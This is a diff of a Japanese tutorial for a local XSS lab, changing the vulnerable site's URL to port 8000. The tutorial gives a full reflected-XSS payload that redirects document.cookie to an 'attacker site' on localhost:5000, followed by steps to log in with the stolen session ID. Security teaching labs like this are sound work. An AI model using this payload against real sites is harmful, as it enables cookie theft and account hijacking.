@@ -7,7 +7,7 @@
 XSS (_クロス_ サイト スクリプティング) の性質上，localhostの他にも別サイトが必要でした．
 
 <dl>
-  <dt>http://脆弱サイト.com</dt>
+  <dt>http://脆弱サイト.com:8000</dt>
   <dd>脆弱性を持ったサイト(以下，脆弱サイト)．ログイン機能がある．</dd>
 
   <dt>http://localhost:5000</dt>
@@ -20,7 +20,7 @@ XSS (_クロス_ サイト スクリプティング) の性質上，localhostの
 ## 脆弱サイトをいじってみる
 
 ```bash
-$ google-chrome http://脆弱サイト.com
+$ google-chrome http://脆弱サイト.com:8000
 ```
 
 1. `/` において， `user: sampleuser`, `pass: samplepass` と入力してログイン
@@ -47,7 +47,7 @@ $ google-chrome http://localhost:5000
 1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)
 
 ```bash
-$ google-chrome --disable-xss-auditor "http://脆弱サイト.com/status?uid=%3Cscript%3Ewindow.location=%22http://localhost:5000/?cookie=%22%2bdocument.cookie%3C/script%3E"
+$ google-chrome --disable-xss-auditor "http://脆弱サイト.com:8000/status?uid=%3Cscript%3Ewindow.location=%22http://localhost:5000/?cookie=%22%2bdocument.cookie%3C/script%3E"
 ```
 
 _注意: まともなブラウザなら，単純なXSS攻撃は検知してscript実行を中止する．`--disable-xss-auditor`によってchromeにわざとXSS攻撃に引っかかってもらう．_
@@ -58,7 +58,7 @@ _注意: まともなブラウザなら，単純なXSS攻撃は検知してscrip
 1. 下記のように脆弱サイトにアクセスし，ログインが成立
 
 ```bash
-$ google-chrome http://脆弱サイト.com/login?sid=[セッションID]
+$ google-chrome http://脆弱サイト.com:8000/login?sid=[セッションID]
 ```
 
 
